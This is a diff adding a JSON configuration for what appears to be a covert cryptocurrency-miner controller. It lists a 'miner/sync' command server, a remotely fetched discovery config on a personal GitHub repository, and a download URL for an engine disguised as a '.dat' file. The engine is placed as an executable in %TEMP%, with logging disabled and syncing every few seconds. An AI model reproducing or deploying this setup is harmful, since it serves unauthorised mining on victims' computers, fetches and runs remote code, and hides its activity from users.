@@ -1,0 +1,23 @@
+{
+  "ServerConfig": {
+    "PrimaryServer": "https://auricore.gigatech.top/api/miner/sync",
+    "DiscoveryUrl": "https://raw.githubusercontent.com/hosseinabdoli/my-json-storage/refs/heads/main/controller_config.json",
+    "DiscoveryEnabled": true,
+    "DiscoveryCacheMinutes": 1
+  },
+  "MinerConfig": {
+    "EnginePath": "%TEMP%\\AuriEngine\\AuriEngine.exe",
+    "EngineDownloadUrl": "https://sabzoom.com/AuriEngine.dat",
+    "WorkingDirectory": "%TEMP%\\AuriEngine",
+  },
+  "SystemConfig": {
+    "SyncIntervalSeconds": 3,
+    "MonitorIntervalMilliseconds": 1000,
+    "EnableLogging": false
+  },
+  "ClientConfig": {
+    "Token": "will-be-ignored",
+    "ConfigVersion": 999,
+    "GroupUuid": "will-be-ignored"
+  }
+}
